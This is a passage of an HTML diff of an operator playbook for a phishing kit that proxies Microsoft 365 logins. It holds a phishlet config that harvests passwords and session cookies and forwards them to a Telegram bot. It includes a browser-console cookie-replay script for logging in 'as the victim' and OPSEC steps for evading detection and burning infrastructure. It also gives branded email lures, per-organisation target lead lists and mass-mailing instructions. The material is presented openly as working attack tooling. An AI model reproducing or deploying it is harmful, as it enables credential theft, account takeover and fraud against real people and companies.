+
+<p>Phishlets define how to interact with each identity provider. They're JSON files in <code>proxy-server/phishlets/</code>.</p>
+
+<h3>Microsoft 365</h3>
+
+<pre><code>{
+  "name": "microsoft",
+  "label": "Microsoft 365",
+  "upstream": "https://login.microsoftonline.com",
+  "hostname": "login.&lt;your-domain&gt;",
+  "credential_fields": {
+    "username": ["loginfmt", "login", "email", "username"],
+    "password": ["passwd", "password", "Password", "secret"]
+  },
+  "session_cookies": [
+    "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT",
+    "SignInStateCookie", "fpc", "esctx"
+  ],
+  "rewrite": {
+    "strip_csp": true,
+    "strip_xfo": true,
+    "strip_hsts": true,
+    "strip_cookie_secure": true,
+    "strip_cookie_domain": true,
+    "rewrite_location": true
+  }
+}</code></pre>
+
+<h3>Key Parameters</h3>
+
 <table>
-<colgroup>
-<col style="width: 43%" />
-<col style="width: 56%" />
-</colgroup>
-<thead>
-<tr>
-<th>Field</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>upstream</code></td>
-<td>Real identity provider domain</td>
-</tr>
-<tr>
-<td><code>hostname</code></td>
-<td>Your subdomain (e.g., login.glnt.cc)</td>
-</tr>
-<tr>
-<td><code>credential_fields.username</code></td>
-<td>POST field names to extract username from</td>
-</tr>
-<tr>
-<td><code>credential_fields.password</code></td>
-<td>POST field names to extract password from</td>
-</tr>
-<tr>
-<td><code>session_cookies</code></td>
-<td>Cookie names to highlight in Telegram</td>
-</tr>
-<tr>
-<td><code>rewrite.strip_csp</code></td>
-<td>Remove Content-Security-Policy (blocks proxy)</td>
-</tr>
-<tr>
-<td><code>rewrite.strip_xfo</code></td>
-<td>Remove X-Frame-Options</td>
-</tr>
-<tr>
-<td><code>rewrite.strip_cookie_secure</code></td>
-<td>Remove Secure flag (works over HTTP to origin)</td>
-</tr>
-<tr>
-<td><code>rewrite.rewrite_location</code></td>
-<td>Rewrite redirect URLs to your domain</td>
-</tr>
-</tbody>
+  <thead><tr><th>Field</th><th>Purpose</th></tr></thead>
+  <tbody>
+    <tr><td><code>upstream</code></td><td>Real identity provider domain</td></tr>
+    <tr><td><code>hostname</code></td><td>Your subdomain (e.g., login.glnt.cc)</td></tr>
+    <tr><td><code>credential_fields.username</code></td><td>POST field names to extract username from</td></tr>
+    <tr><td><code>credential_fields.password</code></td><td>POST field names to extract password from</td></tr>
+    <tr><td><code>session_cookies</code></td><td>Cookie names to highlight in Telegram</td></tr>
+    <tr><td><code>rewrite.strip_csp</code></td><td>Remove Content-Security-Policy (blocks proxy)</td></tr>
+    <tr><td><code>rewrite.strip_xfo</code></td><td>Remove X-Frame-Options</td></tr>
+    <tr><td><code>rewrite.strip_cookie_secure</code></td><td>Remove Secure flag (works over HTTP to origin)</td></tr>
+    <tr><td><code>rewrite.rewrite_location</code></td><td>Rewrite redirect URLs to your domain</td></tr>
+  </tbody>
 </table>
-<h3 id="adding-a-new-phishlet">Adding a New Phishlet</h3>
-<div class="sourceCode" id="cb21"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Create proxy-server/phishlets/&lt;provider&gt;.json</span></span>
-<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Follow the same schema as microsoft.json</span></span>
-<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Key fields: upstream, hostname, credential_fields, session_cookies</span></span>
-<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Rebuild and restart proxy-server</span></span></code></pre></div>
-<hr />
-<h2 id="telegram-integration">8. Telegram Integration</h2>
-<h3 id="creating-a-bot">Creating a Bot</h3>
-<ol type="1">
-<li>Message <a href="https://t.me/BotFather"><span class="citation"
-data-cites="BotFather">@BotFather</span></a> on Telegram</li>
-<li>Send <code>/newbot</code> → name it → get the token</li>
-<li>Message your bot (just say “hi”)</li>
-<li>Get your chat ID: send a message to <a
-href="https://t.me/getidsbot"><span class="citation"
-data-cites="getidsbot">@getidsbot</span></a></li>
-</ol>
-<h3 id="environment-variables">Environment Variables</h3>
-<div class="sourceCode" id="cb22"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="va">TELEGRAM_BOT_TOKEN</span><span class="op">=</span><span class="st">&quot;8576202311:AA...&quot;</span>   <span class="co"># from BotFather</span></span>
-<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="va">TELEGRAM_CHAT_ID</span><span class="op">=</span><span class="st">&quot;5361206216&quot;</span>           <span class="co"># from @getidsbot</span></span></code></pre></div>
-<h3 id="what-you-receive">What You Receive</h3>
+
+<h3>Adding a New Phishlet</h3>
+
+<pre><code># Create proxy-server/phishlets/&lt;provider&gt;.json
+# Follow the same schema as microsoft.json
+# Key fields: upstream, hostname, credential_fields, session_cookies
+# Rebuild and restart proxy-server</code></pre>
+
+<h2>Telegram Integration</h2>
+
+<h3>Creating a Bot</h3>
+
+<div class="step"><p>Message <a href="https://t.me/BotFather">@BotFather</a> on Telegram</p></div>
+<div class="step"><p>Send <code>/newbot</code> &rarr; name it &rarr; get the token</p></div>
+<div class="step"><p>Message your bot (just say "hi")</p></div>
+<div class="step"><p>Get your chat ID: send a message to <a href="https://t.me/getidsbot">@getidsbot</a></p></div>
+
+<h3>Environment Variables</h3>
+
+<pre><code>TELEGRAM_BOT_TOKEN="8576202311:AA..."   # from BotFather
+TELEGRAM_CHAT_ID="5361206216"           # from @getidsbot</code></pre>
+
+<h3>What You Receive</h3>
+
 <p><strong>Instant message:</strong></p>
-<pre><code>🔴 CAPTURE | Microsoft 365 | user@company.com
+
+<pre><code>&#x1F534; CAPTURE | Microsoft 365 | user@company.com
 Username: user@company.com
 Password: Winter2026!
 IP: 203.0.113.5
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
 Time: 2026-06-19 15:04:05 UTC
 Upstream: https://login.microsoftonline.com/...</code></pre>
+
 <p><strong>Session attachment (.txt):</strong></p>
+
 <pre><code>=== AiTM Session Capture ===
 Target: https://login.microsoftonline.com/... (Microsoft 365)
 Username: user@company.com
@@ -1099,357 +946,252 @@ _c=&lt;campaign ID&gt;
 // Target: https://login.microsoftonline.com/...
 (function(){
 var c=[
-{n:&#39;ESTSAUTH&#39;,v:&#39;1.AagAqzBR...&#39;,d:&#39;.login.microsoftonline.com&#39;,p:&#39;/&#39;,s:true,e:&#39;1805900585&#39;},
-{n:&#39;ESTSAUTHPERSISTENT&#39;,v:&#39;1.AagAqzBR...&#39;,d:&#39;.login.microsoftonline.com&#39;,p:&#39;/&#39;,s:true,e:&#39;1805900585&#39;},
+{n:'ESTSAUTH',v:'1.AagAqzBR...',d:'.login.microsoftonline.com',p:'/',s:true,e:'1805900585'},
+{n:'ESTSAUTHPERSISTENT',v:'1.AagAqzBR...',d:'.login.microsoftonline.com',p:'/',s:true,e:'1805900585'},
 ...
 ];
-for(var i=0;i&lt;c.length;i++){document.cookie=c[i].n+&#39;=&#39;+c[i].v+&#39;;expires=&#39;+c[i].e+&#39;;path=&#39;+c[i].p+(c[i].d?&#39;;domain=&#39;+c[i].d:&#39;&#39;)+(c[i].s?&#39;;Secure&#39;:&#39;&#39;)};
+for(var i=0;i&lt;c.length;i++){document.cookie=c[i].n+'='+c[i].v+';expires='+c[i].e+';path='+c[i].p+(c[i].d?';domain='+c[i].d:'')+(c[i].s?';Secure':'')};
 location.reload();
 })();</code></pre>
-<h3 id="cookie-replay">Cookie Replay</h3>
-<ol type="1">
-<li>Open a browser in incognito/private mode</li>
-<li>Navigate to <code>https://login.microsoftonline.com/</code> (or the
-target domain)</li>
-<li>Open Developer Console (F12) → Console tab</li>
-<li>Paste the entire <code>=== COOKIE REPLAY SCRIPT ===</code>
-section</li>
-<li>Press Enter → page reloads → you are authenticated as the
-victim</li>
-</ol>
-<hr />
-<h2 id="opsec-hardening">9. OPSEC Hardening</h2>
-<h3 id="whats-already-hardened">What’s Already Hardened</h3>
+
+<h3>Cookie Replay</h3>
+
+<div class="step"><p>Open a browser in incognito/private mode</p></div>
+<div class="step"><p>Navigate to <code>https://login.microsoftonline.com/</code> (or the target domain)</p></div>
+<div class="step"><p>Open Developer Console (<kbd>F12</kbd>) &rarr; Console tab</p></div>
+<div class="step"><p>Paste the entire <code>=== COOKIE REPLAY SCRIPT ===</code> section</p></div>
+<div class="step"><p>Press Enter &rarr; page reloads &rarr; you are authenticated as the victim</p></div>
+
+<h2>OPSEC Hardening</h2>
+
+<h3>What's Already Hardened</h3>
+
 <table>
-<colgroup>
-<col style="width: 43%" />
-<col style="width: 56%" />
-</colgroup>
-<thead>
-<tr>
-<th>Layer</th>
-<th>Measure</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>URL</strong></td>
-<td>Fragment-based delivery, random 3-byte prefix, AES-256-GCM encrypted
-— no static signatures</td>
-</tr>
-<tr>
-<td><strong>JS</strong></td>
-<td>All symbols obfuscated (<code>_k</code>, <code>_d</code>,
-<code>_b</code> instead of <code>AES_KEY_B64</code>,
-<code>decryptAESGCM</code>)</td>
-</tr>
-<tr>
-<td><strong>Endpoints</strong></td>
-<td><code>/auth</code> instead of <code>/capture</code> — looks
-legitimate</td>
-</tr>
-<tr>
-<td><strong>Cookies</strong></td>
-<td><code>_s</code>, <code>_c</code> instead of <code>__upstream</code>,
-<code>__campaign</code> — no signature</td>
-</tr>
-<tr>
-<td><strong>Form fields</strong></td>
-<td><code>loginfmt</code>, <code>passwd</code> matching real Microsoft
-names</td>
-</tr>
-<tr>
-<td><strong>Headers</strong></td>
-<td>CSP/XFO stripped, Server overridden to <code>cloudflare</code></td>
-</tr>
-<tr>
-<td><strong>Bots</strong></td>
-<td>14 crawler patterns blocked at edge + server</td>
-</tr>
-<tr>
-<td><strong>Rate</strong></td>
-<td>10 req/min per IP</td>
-</tr>
-<tr>
-<td><strong>Errors</strong></td>
-<td>Custom 404 page, no Go stack traces</td>
-</tr>
-<tr>
-<td><strong>Logs</strong></td>
-<td>No plaintext credentials in stdout</td>
-</tr>
-<tr>
-<td><strong>JSONL</strong></td>
-<td>Permission 0600</td>
-</tr>
-<tr>
-<td><strong>CDN</strong></td>
-<td><code>aadcdn.msauth.net</code> assets load directly from Microsoft —
-no SRI breakage</td>
-</tr>
-<tr>
-<td><strong>Comments</strong></td>
-<td>All HTML/JS dev comments stripped</td>
-</tr>
-<tr>
-<td><strong>IP</strong></td>
-<td>Origin hidden behind Cloudflare Worker</td>
-</tr>
-</tbody>
+  <thead><tr><th>Layer</th><th>Measure</th></tr></thead>
+  <tbody>
+    <tr><td><strong>URL</strong></td><td>Fragment-based delivery, random 3-byte prefix, AES-256-GCM encrypted &mdash; no static signatures</td></tr>
+    <tr><td><strong>JS</strong></td><td>All symbols obfuscated (<code>_k</code>, <code>_d</code>, <code>_b</code> instead of <code>AES_KEY_B64</code>, <code>decryptAESGCM</code>)</td></tr>
+    <tr><td><strong>Endpoints</strong></td><td><code>/auth</code> instead of <code>/capture</code> &mdash; looks legitimate</td></tr>
+    <tr><td><strong>Cookies</strong></td><td><code>_s</code>, <code>_c</code> instead of <code>__upstream</code>, <code>__campaign</code> &mdash; no signature</td></tr>
+    <tr><td><strong>Form fields</strong></td><td><code>loginfmt</code>, <code>passwd</code> matching real Microsoft names</td></tr>
+    <tr><td><strong>Headers</strong></td><td>CSP/XFO stripped, Server overridden to <code>cloudflare</code></td></tr>
+    <tr><td><strong>Bots</strong></td><td>14 crawler patterns blocked at edge + server</td></tr>
+    <tr><td><strong>Rate</strong></td><td>10 req/min per IP</td></tr>
+    <tr><td><strong>Errors</strong></td><td>Custom 404 page, no Go stack traces</td></tr>
+    <tr><td><strong>Logs</strong></td><td>No plaintext credentials in stdout</td></tr>
+    <tr><td><strong>JSONL</strong></td><td>Permission 0600</td></tr>
+    <tr><td><strong>CDN</strong></td><td><code>aadcdn.msauth.net</code> assets load directly from Microsoft &mdash; no SRI breakage</td></tr>
+    <tr><td><strong>Comments</strong></td><td>All HTML/JS dev comments stripped</td></tr>
+    <tr><td><strong>IP</strong></td><td>Origin hidden behind Cloudflare Worker</td></tr>
+  </tbody>
 </table>
-<h3 id="what-you-must-do">What You Must Do</h3>
-<ul class="task-list">
-<li><label><input type="checkbox" /><strong>Lock SSH port</strong> to
-your IP only (currently 0.0.0.0/0)</label></li>
-<li><label><input type="checkbox" /><strong>Lock port 9091</strong> to
-Cloudflare IP ranges: https://www.cloudflare.com/ips-v4</label></li>
-<li><label><input type="checkbox" /><strong>Lock port 9092</strong> to
-your IP only</label></li>
-<li><label><input type="checkbox" /><strong>Change AES key</strong> from
-the default — run <code>keygen.go</code></label></li>
-<li><label><input type="checkbox" /><strong>Burn domain</strong> after
-each campaign or periodically</label></li>
-<li><label><input type="checkbox" /><strong>Rotate Cloudflare
-Workers</strong> between campaigns</label></li>
-<li><label><input type="checkbox" /><strong>Never commit
-<code>.env</code></strong> — use environment variables</label></li>
-<li><label><input type="checkbox" /><strong>Never discuss OpSec in a
-browser-based session</strong> — local terminal only</label></li>
-<li><label><input type="checkbox" /><strong>Separate sender
-infrastructure</strong> from phishing infrastructure — do not use the
-phishing domain as the email sender</label></li>
-<li><label><input type="checkbox" /><strong>Verify header
-hygiene</strong> before every campaign — check raw email source for
-phishing domain or origin IP leaks</label></li>
-<li><label><input type="checkbox" /><strong>Burn SMTP credentials and
-sender domains</strong> between campaigns — do not reuse across
-targets</label></li>
-</ul>
-<hr />
-<h2 id="analytics-dashboard">10. Analytics Dashboard</h2>
+
+<h3>What You Must Do</h3>
+
+<div class="warn"><strong>Operational checklist &mdash; complete all items before going live:</strong></div>
+
+<table>
+  <tbody>
+    <tr><td>&#x2610; <strong>Lock SSH port</strong> to your IP only (currently 0.0.0.0/0)</td></tr>
+    <tr><td>&#x2610; <strong>Lock port 9091</strong> to Cloudflare IP ranges: <a href="https://www.cloudflare.com/ips-v4">https://www.cloudflare.com/ips-v4</a></td></tr>
+    <tr><td>&#x2610; <strong>Lock port 9092</strong> to your IP only</td></tr>
+    <tr><td>&#x2610; <strong>Change AES key</strong> from the default &mdash; run <code>keygen.go</code></td></tr>
+    <tr><td>&#x2610; <strong>Burn domain</strong> after each campaign or periodically</td></tr>
+    <tr><td>&#x2610; <strong>Rotate Cloudflare Workers</strong> between campaigns</td></tr>
+    <tr><td>&#x2610; <strong>Never commit <code>.env</code></strong> &mdash; use environment variables</td></tr>
+    <tr><td>&#x2610; <strong>Never discuss OpSec in a browser-based session</strong> &mdash; local terminal only</td></tr>
+    <tr><td>&#x2610; <strong>Separate sender infrastructure</strong> from phishing infrastructure &mdash; do not use the phishing domain as the email sender</td></tr>
+    <tr><td>&#x2610; <strong>Verify header hygiene</strong> before every campaign &mdash; check raw email source for phishing domain or origin IP leaks</td></tr>
+    <tr><td>&#x2610; <strong>Burn SMTP credentials and sender domains</strong> between campaigns &mdash; do not reuse across targets</td></tr>
+  </tbody>
+</table>
+
+<h2>Analytics Dashboard</h2>
+
 <pre><code>http://&lt;EC2-IP&gt;:9092/?token=&lt;YOUR_TOKEN&gt;</code></pre>
-<p><strong>Features:</strong> - Total events, success rate, unique IPs,
-active campaigns - Campaign breakdown table - Top victim IPs - Recent
-events timeline - Auto-refresh every 30 seconds - No JavaScript required
-(server-rendered HTML) - Token authentication required</p>
-<p><strong>Security:</strong> Access only from your IP (security group
-rule). Never expose to public internet.</p>
-<hr />
-<h2 id="troubleshooting">11. Troubleshooting</h2>
-<table>
-<colgroup>
-<col style="width: 56%" />
-<col style="width: 43%" />
-</colgroup>
-<thead>
-<tr>
-<th>Symptom</th>
-<th>Check</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>“Cannot verify link”</td>
-<td>AES key mismatch between payload-generator and bootloader.html</td>
-</tr>
-<tr>
-<td>“404 page not found” on <code>/login</code></td>
-<td>Work accounts only — personal Microsoft accounts redirect to
-office.com</td>
-</tr>
-<tr>
-<td>SSL errors in console</td>
-<td><code>hostname</code> field in phishlet JSON must match your
-subdomain</td>
-</tr>
-<tr>
-<td>Worker returns 502</td>
-<td>EC2 security group blocking Cloudflare IPs</td>
-</tr>
-<tr>
-<td>Worker returns 1003</td>
-<td>ORIGIN_URL secret not set or wrong format</td>
-</tr>
-<tr>
-<td>Telegram not receiving</td>
-<td><code>TELEGRAM_BOT_TOKEN</code> and <code>TELEGRAM_CHAT_ID</code>
-must be set before build</td>
-</tr>
-<tr>
-<td>Rate limited (429)</td>
-<td>Wait 1 minute or use different IP</td>
-</tr>
-<tr>
-<td>Bootloader shows spinner forever</td>
-<td>JavaScript error — check browser console</td>
-</tr>
-<tr>
-<td>Emails landing in spam</td>
-<td>Run through mail-tester.com — score below 9 means fix
-SPF/DKIM/DMARC</td>
-</tr>
-<tr>
-<td>SuperMailer SMTP auth fails</td>
-<td>Verify port 587/TLS, check credentials, ensure IP not blocked by
-relay</td>
-</tr>
-<tr>
-<td>Bounce rate &gt;5% during campaign</td>
-<td>Pause immediately — investigate invalid addresses or sender
-reputation</td>
-</tr>
-<tr>
-<td>High opens, zero captures</td>
-<td>Bootloader or proxy may be down — verify with
-<code>curl -I https://&lt;domain&gt;/</code></td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h2 id="file-map">12. File Map</h2>
-<pre><code>azure-phish-kit/
-├── proxy-server/
-│   ├── main.go              # AiTM reverse proxy (the core)
-│   ├── bootloader.html       # Embedded JS decryptor
-│   ├── phishlet.go           # Phishlet loader + matcher
-│   ├── ratelimit.go          # Token-bucket rate limiter
-│   └── phishlets/
-│       ├── microsoft.json    # Microsoft 365 phishlet
-│       ├── google.json       # Google Workspace phishlet
-│       └── okta.json         # Okta SSO phishlet
-├── payload-generator/
-│   ├── main.go               # AES-256-GCM payload encryptor
-│   └── keygen.go             # Key generator
-├── analytics-server/
-│   ├── main.go               # Dashboard HTTP server
-│   ├── analytics.go          # JSONL parser + aggregator
-│   └── dashboard.html        # Server-rendered template
-├── cdn-config/
-│   ├── worker.js             # Cloudflare Worker
-│   └── wrangler.toml         # Worker deployment config
-├── campaign-emails/
-│   ├── email/                # Inline HTML email lures (paste into SuperMailer HTML Source)
-│   │   ├── shared-document.html
-│   │   ├── contract-signature.html
-│   │   ├── expense-report.html
-│   │   ├── hr-document.html
-│   │   ├── invoice-payment.html
-│   │   ├── it-support.html
-│   │   ├── meeting-invite.html
-│   │   ├── package-delivery.html
-│   │   ├── security-alert.html
-│   │   └── voicemail-notification.html
-│   └── attachments/          # HTML attachment lures (attach to email in SuperMailer)
-│       ├── adobe-contract.html
-│       ├── docusign-wire.html
-│       ├── dropbox-share.html
-│       ├── excel-shared.html
-│       ├── gdocs-shared.html
-│       ├── onedrive-file.html
-│       ├── sharepoint-doc.html
-│       ├── stripe-payment.html
-│       ├── teams-recording.html
-│       └── zoom-recording.html
-├── campaign-emails-obfuscated/  # Obfuscated copies of email lures (production-ready)
-│   ├── email/
-│   └── attachments/
-├── scripts/
-│   └── generate-url.sh       # URL assembly helper
-├── data/
-│   ├── captures.jsonl        # Event log (gitignored)
-│   └── leads/                # Target lead CSVs for SuperMailer import
-│       ├── addus_com.csv
-│       └── ...               # (one CSV per target organization)
-├── CURRENT_LINK.txt           # Active phishing URL (single source of truth)
-└── docs/
-    ├── architecture.md
-    ├── proxy-architecture.md
-    ├── threat-intel-report.md
-    └── playbook/
-        └── glnt-phish-kit-playbook.md</code></pre>
-<hr />
-<h2 id="quick-reference">13. Quick Reference</h2>
-<h3 id="payload-url">Payload &amp; URL</h3>
-<div class="sourceCode" id="cb27"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Generate key</span></span>
-<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> payload-generator <span class="kw">&amp;&amp;</span> <span class="ex">go</span> run keygen.go</span>
-<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Generate URL</span></span>
-<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a><span class="ex">go</span> run . <span class="at">--key</span> <span class="op">&lt;</span>KEY<span class="op">&gt;</span> --email <span class="op">&lt;</span>EMAIL<span class="op">&gt;</span> --redirect <span class="op">&lt;</span>OAUTH_URL<span class="op">&gt;</span> --campaign <span class="op">&lt;</span>ID<span class="op">&gt;</span></span>
-<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb27-7"><a href="#cb27-7" aria-hidden="true" tabindex="-1"></a><span class="co"># View current active link</span></span>
-<span id="cb27-8"><a href="#cb27-8" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> CURRENT_LINK.txt</span></code></pre></div>
-<h3 id="build-deploy">Build &amp; Deploy</h3>
-<div class="sourceCode" id="cb28"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Build proxy (Linux)</span></span>
-<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> proxy-server <span class="kw">&amp;&amp;</span> <span class="va">GOOS</span><span class="op">=</span>linux <span class="va">GOARCH</span><span class="op">=</span>amd64 <span class="ex">go</span> build <span class="at">-o</span> proxy-srv .</span>
-<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Deploy to EC2</span></span>
-<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a><span class="fu">scp</span> proxy-srv ubuntu@<span class="op">&lt;</span>EC2-IP<span class="op">&gt;</span>:/home/ubuntu/azure-phish-kit/proxy-server/</span>
-<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> ubuntu@<span class="op">&lt;</span>EC2-IP<span class="op">&gt;</span> <span class="st">&quot;sudo systemctl restart phish-proxy&quot;</span></span>
-<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a><span class="co"># Deploy Worker</span></span>
-<span id="cb28-9"><a href="#cb28-9" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> cdn-config <span class="kw">&amp;&amp;</span> <span class="ex">npx</span> wrangler deploy</span>
-<span id="cb28-10"><a href="#cb28-10" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb28-11"><a href="#cb28-11" aria-hidden="true" tabindex="-1"></a><span class="co"># View captures</span></span>
-<span id="cb28-12"><a href="#cb28-12" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> ubuntu@<span class="op">&lt;</span>EC2-IP<span class="op">&gt;</span> <span class="st">&quot;tail -f /home/ubuntu/azure-phish-kit/data/captures.jsonl&quot;</span></span>
-<span id="cb28-13"><a href="#cb28-13" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb28-14"><a href="#cb28-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Analytics</span></span>
-<span id="cb28-15"><a href="#cb28-15" aria-hidden="true" tabindex="-1"></a><span class="ex">open</span> http://<span class="op">&lt;</span>EC2-IP<span class="op">&gt;</span>:9092/<span class="pp">?</span>token=<span class="op">&lt;</span>TOKEN<span class="op">&gt;</span></span></code></pre></div>
-<h3 id="supermailer-workflow">SuperMailer Workflow</h3>
-<div class="sourceCode" id="cb29"><pre
-class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Grab the latest lure link</span></span>
-<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> CURRENT_LINK.txt</span>
-<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="co"># → https://glnt.cc/#&lt;encrypted-fragment&gt;</span></span>
-<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Build the lure with the link embedded</span></span>
-<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a><span class="co"># (link is already embedded in campaign-emails/email/*.html files</span></span>
-<span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a><span class="co">#  — just regenerate if you need a fresh link per campaign)</span></span>
-<span id="cb29-8"><a href="#cb29-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb29-9"><a href="#cb29-9" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. In SuperMailer:</span></span>
-<span id="cb29-10"><a href="#cb29-10" aria-hidden="true" tabindex="-1"></a><span class="co">#    Settings → SMTP Server → Port 587, STARTTLS, set throttle 50/hr</span></span>
-<span id="cb29-11"><a href="#cb29-11" aria-hidden="true" tabindex="-1"></a><span class="co">#    Recipients → Import CSV → data/leads/&lt;target&gt;.csv</span></span>
-<span id="cb29-12"><a href="#cb29-12" aria-hidden="true" tabindex="-1"></a><span class="co">#      Map: email→Email, first→FirstName, last→LastName</span></span>
-<span id="cb29-13"><a href="#cb29-13" aria-hidden="true" tabindex="-1"></a><span class="co">#    Campaign → Message → HTML Source → paste campaign-emails/email/&lt;lure&gt;.html</span></span>
-<span id="cb29-14"><a href="#cb29-14" aria-hidden="true" tabindex="-1"></a><span class="co">#    Sender: From Name matches lure brand, From Email = sender domain</span></span>
-<span id="cb29-15"><a href="#cb29-15" aria-hidden="true" tabindex="-1"></a><span class="co">#    Send Test to yourself → verify at mail-tester.com (score 9+)</span></span>
-<span id="cb29-16"><a href="#cb29-16" aria-hidden="true" tabindex="-1"></a><span class="co">#    Send Campaign → monitor bounce rate &lt;5%, cross-ref analytics dashboard</span></span>
-<span id="cb29-17"><a href="#cb29-17" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb29-18"><a href="#cb29-18" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. For attachment lures:</span></span>
-<span id="cb29-19"><a href="#cb29-19" aria-hidden="true" tabindex="-1"></a><span class="co">#    Campaign → Message → write short body text</span></span>
-<span id="cb29-20"><a href="#cb29-20" aria-hidden="true" tabindex="-1"></a><span class="co">#    Attach: campaign-emails/attachments/&lt;brand&gt;.html</span></span>
-<span id="cb29-21"><a href="#cb29-21" aria-hidden="true" tabindex="-1"></a><span class="co">#    Sender must match the attachment brand</span></span>
-<span id="cb29-22"><a href="#cb29-22" aria-hidden="true" tabindex="-1"></a><span class="co">#    Test by opening the attachment yourself before sending</span></span></code></pre></div>
-<h3 id="campaign-checklist">Campaign Checklist</h3>
-<ul class="task-list">
-<li><label><input type="checkbox" />Fresh link generated and saved to
-<code>CURRENT_LINK.txt</code></label></li>
-<li><label><input type="checkbox" />Link embedded in lure HTML (paste
-into SuperMailer HTML Source)</label></li>
-<li><label><input type="checkbox" />SMTP configured: Port 587, STARTTLS,
-throttle 50-100/hr</label></li>
-<li><label><input type="checkbox" />Leads imported from
-<code>data/leads/</code> with correct column mapping</label></li>
-<li><label><input type="checkbox" />Sender domain has valid SPF, DKIM,
-DMARC</label></li>
-<li><label><input type="checkbox" />Sender identity matches lure
-branding</label></li>
-<li><label><input type="checkbox" />Test email sent to yourself —
-renders correctly in Gmail, Outlook, mobile</label></li>
-<li><label><input type="checkbox" />mail-tester.com score
-9+/10</label></li>
-<li><label><input type="checkbox" />Link clickable from received email —
-reaches real login page</label></li>
-<li><label><input type="checkbox" />Telegram capture confirmed from
-test</label></li>
-<li><label><input type="checkbox" />Headers checked — no phishing domain
-or origin IP leaks</label></li>
-<li><label><input type="checkbox" />Warm-up schedule planned (10/hr →
-50/hr over 3 days)</label></li>
-<li><label><input type="checkbox" />Analytics dashboard open for
-monitoring ```</label></li>
+
+<p><strong>Features:</strong></p>
+
+<ul>
+  <li>Total events, success rate, unique IPs, active campaigns</li>
+  <li>Campaign breakdown table</li>
+  <li>Top victim IPs</li>
+  <li>Recent events timeline</li>
+  <li>Auto-refresh every 30 seconds</li>
+  <li>No JavaScript required (server-rendered HTML)</li>
+  <li>Token authentication required</li>
 </ul>
-<hr />
-<p><em>End of Playbook</em></p>
+
+<div class="note"><strong>Security:</strong> Access only from your IP (security group rule). Never expose to public internet.</div>
+
+<h2>Troubleshooting</h2>
+
+<table>
+  <thead><tr><th>Symptom</th><th>Check</th></tr></thead>
+  <tbody>
+    <tr><td>"Cannot verify link"</td><td>AES key mismatch between payload-generator and bootloader.html</td></tr>
+    <tr><td>"404 page not found" on <code>/login</code></td><td>Work accounts only &mdash; personal Microsoft accounts redirect to office.com</td></tr>
+    <tr><td>SSL errors in console</td><td><code>hostname</code> field in phishlet JSON must match your subdomain</td></tr>
+    <tr><td>Worker returns 502</td><td>EC2 security group blocking Cloudflare IPs</td></tr>
+    <tr><td>Worker returns 1003</td><td>ORIGIN_URL secret not set or wrong format</td></tr>
+    <tr><td>Telegram not receiving</td><td><code>TELEGRAM_BOT_TOKEN</code> and <code>TELEGRAM_CHAT_ID</code> must be set before build</td></tr>
+    <tr><td>Rate limited (429)</td><td>Wait 1 minute or use different IP</td></tr>
+    <tr><td>Bootloader shows spinner forever</td><td>JavaScript error &mdash; check browser console</td></tr>
